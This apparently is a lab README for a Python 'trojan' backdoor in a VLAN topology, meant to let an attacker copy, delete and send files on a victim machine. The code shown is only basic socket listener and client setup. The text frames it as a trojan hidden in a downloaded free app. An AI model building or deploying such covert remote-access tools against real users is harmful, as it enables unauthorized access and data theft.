# Back door attack AAA
in this topology we are going to use python scripts as a Trajon to create a back door on the victim computer
to copy files from victim machine, delete files on this target, send file to this machine etc.


# :zap: How this works :zap: 
:star: Step 1: Firs, imagine that this target has downloaded a file from internet and inside this file there is a Trojan file that need to be 
executed to create a connection from target machine to our computer, then we are ready to go. 

in this topology, the computers are in different vlans, and we are going to create the back door from PC called Target to the hacker's computer called attacker. 

##
<img src=images/3.PNG  alt="alt text" width="950" height="550">

##


# :zap: Waiting for target to execute :zap: 

:star: Here the attacker by running this part of command start listening the to his port waiting for 
any incoming connection:


```python
import os
import socket

s = socket.socket()
host = socket.gethostname()
port = 8080

s.bind((host, port))


print (" ")
print (" Server is currently running @ ", host)
print (" ")
print (" Waiting for any incoming connection... ")


```
##
<img src=images/5.PNG  alt="alt text" width="950" height="550">

##

:star: In this photo we can see that the attacker has executed the python script and is waiting.

# :zap: Target executes our python script :zap:

:star: Step 2: Imagine the target has downloaded an executable file like a free application that our attacker uploaded befor from internet,
now he want to install that application that contains our Trojan, so when he executes our file, our python script start working. 
it asks the server name, we put the server's name [DESKTOP-E80I7RR] and the connection will be created between these two machines.
as the result you can see ``` Connected to the server successfully ``` on CLI of the target PC.

```python
#!/usr/bin/python
import os
import socket

s = socket.socket()
port = 8080
host = "127.0.0.1"
host = input (str("Please enter the server address : "))


s.connect((host,port))

print (" ")
print (" Connected to the server successfully")
print (" ")

```
##
<img src=images/6.PNG  alt="alt text" width="950" height="550">

##

# :zap: Connection on attacker's pc :zap:

:star: As soon as the script is executed the attacker's machin will receive access to the CLI of the Target PC, and now we
are ready to go. It shows us to which IP address is connected and on wich port as is shown on the next photo by running this part of program. 

```python
s.listen(1)
conn, addr = s.accept()
print("")
print (addr, "Has connected to the server successfully ")

```

##
<img src=images/7.PNG  alt="alt text" width="950" height="550">

##

:ostar: Let's see on the Target PC, in which directory we are working by running the command:

```
view_cwd
```









